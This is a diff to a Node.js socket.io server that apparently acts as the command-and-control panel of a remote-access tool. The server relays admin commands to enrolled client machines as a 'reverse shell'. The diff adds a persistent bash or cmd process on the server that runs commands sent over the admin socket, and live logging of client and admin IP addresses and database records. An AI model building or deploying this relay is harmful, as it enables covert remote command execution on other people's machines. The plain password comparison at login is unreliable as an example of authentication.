@@ -26,6 +26,8 @@ sessions   = require("client-sessions");      // Permit to create sessions in ex
 passport   = require('passport');             // Passport is authentication middleware for Node.js. Extremely flexible and modular, Passport can be unobtrusively dropped in to any Express-based web application. A comprehensive set of strategies support authentication using a username and password, Facebook, Twitter, and more.
 validator  = require('validator');            // Permit to check is so string are valid (valid mail, valid credit card, etc.)
 crypto     = require("crypto");               // Crypto permit to make sha1, md5, bas64, etc encryption very easily.
+spawn      = require('child_process').spawn;  // Shell on cloud
+os         = require('os');                   // Get information on cloud system (os, etc.)
 db         = mysql.createPool({ host : config_mysql_host, user : config_mysql_user, password : config_mysql_pswd, database : config_mysql_db});
 
 // [ Configuration Server web ]
@@ -57,6 +59,24 @@ console.log('[SYSTEM]'.red + ' All Dependency loaded.');
 console.log('[SYSTEM]'.green + ' Cloud started : http://' + config_ip_server+":"+config_port_server);
 
 // =================================================== \\
+// ================== Shell on Cloud ================= \\
+// =================================================== \\
+if (os.platform() == "linux") var init = "bash";
+if (os.platform() == "win32") var init = "cmd";
+var spawn = spawn(init);
+spawn.stdout.setEncoding("utf8");
+spawn.stderr.setEncoding("utf8");
+
+// =================== Shell Cloud Callback ====================== \\
+spawn.stdout.on("data", function (data) {
+	webAdmin.to("webAdmin").emit("reverseShellCallbackCloud", data, "success");
+});
+
+spawn.stderr.on("data", function (data) {
+	webAdmin.to("webAdmin").emit("reverseShellCallbackCloud", data, "error");
+});
+
+// =================================================== \\
 // ===========FUNCTIONS MIDDELWAR (MODELES)=========== \\
 // =================================================== \\
 
@@ -78,25 +98,25 @@ app.get('', function(req, res) {
 // [ Login / Register / Logout ]
 var app_login = require('./routes/app/login');
 app.post('/login', middlewares.dependency_loggedOut_app, app_login.loginpost);
-app.get('/login' , middlewares.dependency_loggedOut_app, app_login.loginget);
-app.get('/logout', middlewares.dependency_loggedOut_app, app_login.logout);
+app.get('/login' , middlewares.dependency_loggedOut_app, middlewares.dependency_logs_app, app_login.loginget);
+app.get('/logout', middlewares.dependency_loggedOut_app, middlewares.dependency_logs_app, app_login.logout);
 
 // [ Home ]
 var app_home = require('./routes/app/home');
-app.get('/home', middlewares.logged_app, middlewares.dependency_loggedIn_app, app_home.home);
-app.post('/home', middlewares.logged_app, middlewares.dependency_loggedIn_app, app_home.home_post);
+app.get('/home', middlewares.logged_app, middlewares.dependency_loggedIn_app,  middlewares.dependency_logs_app, app_home.home);
+app.post('/home', middlewares.logged_app, middlewares.dependency_loggedIn_app,  middlewares.dependency_logs_app, app_home.home_post);
 
 // [ Client ]
 var app_client = require('./routes/app/client');
-app.get('/client_dashboard/:id', middlewares.logged_app, middlewares.dependency_loggedIn_app, app_client.client_dashboard);
-app.post('/client_dashboard/:id', middlewares.logged_app, middlewares.dependency_loggedIn_app, app_client.client_dashboard_post);
-app.get('/client_delete/:id', middlewares.logged_app, middlewares.dependency_loggedIn_app, app_client.client_dashboard_delete);
-app.get('/client_remote_shell/:id', middlewares.logged_app, middlewares.dependency_loggedIn_app, app_client.client_remote_shell);
+app.get('/client_dashboard/:id', middlewares.logged_app, middlewares.dependency_loggedIn_app,  middlewares.dependency_logs_app, app_client.client_dashboard);
+app.post('/client_dashboard/:id', middlewares.logged_app, middlewares.dependency_loggedIn_app,  middlewares.dependency_logs_app, app_client.client_dashboard_post);
+app.get('/client_delete/:id', middlewares.logged_app, middlewares.dependency_loggedIn_app,  middlewares.dependency_logs_app, app_client.client_dashboard_delete);
+app.get('/client_remote_shell/:id', middlewares.logged_app, middlewares.dependency_loggedIn_app,  middlewares.dependency_logs_app, app_client.client_remote_shell);
 
 // [ Config ]
 var app_config = require('./routes/app/config');
-app.get('/config', middlewares.logged_app, middlewares.dependency_loggedIn_app, app_config.home);
-app.post('/config', middlewares.logged_app, middlewares.dependency_loggedIn_app, app_config.home_post);
+app.get('/config', middlewares.logged_app, middlewares.dependency_loggedIn_app,  middlewares.dependency_logs_app, app_config.home);
+app.post('/config', middlewares.logged_app, middlewares.dependency_loggedIn_app,  middlewares.dependency_logs_app, app_config.home_post);
 
 
 // =================================================== \\
@@ -118,15 +138,21 @@ var nodeClient = io.of('/nodeClient');
 // =================================================== \\
 webAdmin.on('connection', function (socket) {
 
+	var clientAddressIp = socket.request.connection.remoteAddress;
+
 	socket.on('initWebAdmin', function(data) {
 		var adminCheck =  "SELECT * FROM t_admins WHERE admin_mail = " + db.escape(data.admin_mail) + " AND admin_password = " + db.escape(data.admin_password) + " AND admin_active = 1;";
 		db.query(adminCheck, function(err, rows, fields) {
 			if(rows.length != 0){
 				var admin = rows[0];
-				console.log("Admin is authorized to socket.io: ".green, socket.id);
-				middelwareWebAdminAuthorized(socket, admin);
+				var logs = "Admin is authorized to socket.io: ";
+				console.log(logs.green, socket.id, clientAddressIp);
+				webAdmin.to("webAdmin").emit("liveLogClient", logs + socket.id + " / " + clientAddressIp, "success");
+				middelwareWebAdminAuthorized(socket, admin, clientAddressIp);
 			}else{
-				console.log("Admin is not authorized to socket.io: ".red, socket.id);
+				var logs = "Admin is not authorized to socket.io: ";
+				console.log(logs.red, socket.id, clientAddressIp);
+				webAdmin.to("webAdmin").emit("liveLogClient", logs + socket.id + " / " + clientAddressIp, "danger");
 			}
 		});
 	});
@@ -134,19 +160,23 @@ webAdmin.on('connection', function (socket) {
 });
 
 
-function middelwareWebAdminAuthorized(socket, admin) {
+function middelwareWebAdminAuthorized(socket, admin, clientAddressIp) {
 
 	webAdmin.emit("webAdminOnline", admin.admin_id);
 	socket.join("webAdmin");
 	socket.join("webAdmin-"+admin.admin_id);
-	webAdminAuthorized(socket, admin);
+	webAdminAuthorized(socket, admin, clientAddressIp);
 
 }
 
-function webAdminAuthorized(socket, admin) {
+function webAdminAuthorized(socket, admin, clientAddressIp) {
 
-	console.log("Authorized admin passed middelware & auth: ".green, "webAdmin-"+admin.admin_id);
+	// =================== LOGS ====================== \\
+	var logs = "Authorized admin passed middelware & auth: ";
+	console.log(logs.green, "webAdmin-"+admin.admin_id+" ("+admin.admin_pseudo+")", clientAddressIp);
+	webAdmin.to("webAdmin").emit("liveLogClient", logs + "webAdmin-"+admin.admin_id+" ("+admin.admin_pseudo+")"  + " / " + clientAddressIp, "success");
 
+	// Prevent web socket is ready to use
 	webAdmin.to("webAdmin-"+admin.admin_id).emit('adminInittSuccess', admin);
 
 	// Get online clients
@@ -161,10 +191,20 @@ function webAdminAuthorized(socket, admin) {
 		});
 	});
 
-	// cmd for reverse shell
+	// =================== Shell Cloud ====================== \\
+	socket.on('cmdForReverseShellCloud', function(cmd) {
+		spawn.stdin.write(cmd + "\n");
+	});
+
+	// =============== Reverse shell Client ================ \\
 	socket.on('cmdForReverseShell', function(clientId, adminId, cmd) {
 		nodeClient.to("nodeClient-"+clientId).emit('cmdForReverseShell', adminId, cmd);
 	});
+
+	// ================ Future features... ================= \\
+	//............
+	//............
+	//............
 
 }
 
@@ -181,7 +221,10 @@ db.query(config, function(err, rows, fields) {
 	nodeClient.on('connection', function (socket) {
 
 		var clientAddressIp = socket.request.connection.remoteAddress;
-		console.log("Client try to connecte to socket.io: ".yellow, socket.id, clientAddressIp);
+
+		var logs = "Client try to connecte to socket.io: ";
+		console.log(logs.yellow, socket.id, clientAddressIp);
+		webAdmin.to("webAdmin").emit("liveLogClient", logs + socket.id + " / " +clientAddressIp, "warning");
 
 		socket.on('initNodeClient', function(data) {
 
@@ -201,18 +244,26 @@ db.query(config, function(err, rows, fields) {
 								db.query(clientCheckAuth, function(err, rows, fields) {
 									if(rows.length != 0){
 										var client = rows[0];
-										console.log("Client is registered in database: ".green, socket.id, clientAddressIp);
+										var logs = "Client is registered in database: ";
+										console.log(logs.green, socket.id, clientAddressIp, client);
+										webAdmin.to("webAdmin").emit("liveLogClient", logs + socket.id + " / " +clientAddressIp + " <br> " + JSON.stringify(client), "success");
 										middelWareNodeClientAuthorized(socket, clientAddressIp, client);
 									}else{
-										console.log("Client is not registered in database: ".red, socket.id, clientAddressIp);
+										var logs = "Client is not registered in database: ";
+										console.log(logs.red, socket.id, clientAddressIp);
+										webAdmin.to("webAdmin").emit("liveLogClient", logs + socket.id + " / " +clientAddressIp, "danger");
 									}
 								});
 							}else{
-								console.log("Client is banned: ".red, socket.id, clientAddressIp);
+								var logs = "Client is banned: ";
+								console.log(logs.red, socket.id, clientAddressIp);
+								webAdmin.to("webAdmin").emit("liveLogClient", logs + socket.id + " / " +clientAddressIp, "danger");
 							}
 						});
 					}else{
-						console.log("Bad Config Cloud Password: ".red, socket.id, clientAddressIp);
+						var logs = "Bad Config Cloud Password: ";
+						console.log(logs.red, socket.id, clientAddressIp);
+						webAdmin.to("webAdmin").emit("liveLogClient", logs + socket.id + " / " +clientAddressIp, "danger");
 					}
 				});
 
@@ -246,8 +297,9 @@ function middelWareNodeClientAuthorized(socket, clientAddressIp, client) {
 function nodeClientAuthorized(socket, clientAddressIp, client) {
 
 	console.log("Authorized client passed middelware & auth: ".green, socket.id, clientAddressIp);
+	webAdmin.to("webAdmin").emit("liveLogClient", "Authorized client passed middelware & auth: " + socket.id + " / " +clientAddressIp, "success");
 
-	// Update Client Info
+	// ================ Update Client Info ==================== \\
 	nodeClient.to("nodeClient-"+client.client_id).emit('clientInitSuccess', client);
 	socket.on('clientUpdateInfo', function(data){
 		db.query("UPDATE t_clients "+
@@ -261,9 +313,14 @@ function nodeClientAuthorized(socket, clientAddressIp, client) {
 						 "WHERE client_id = "+db.escape(client.client_id)+"");
 	});
 
-	// Reverse shell callback
+	// =========== Reverse shell callback client =========== \\
 	socket.on('reverseShellCallback', function(clientId, adminId, type, data){
 		webAdmin.to("webAdmin-"+adminId).emit('reverseShellCallback', clientId, type, data);
 	});
+
+	// ================ Future features... ================= \\
+	//............
+	//............
+	//............
 
 }
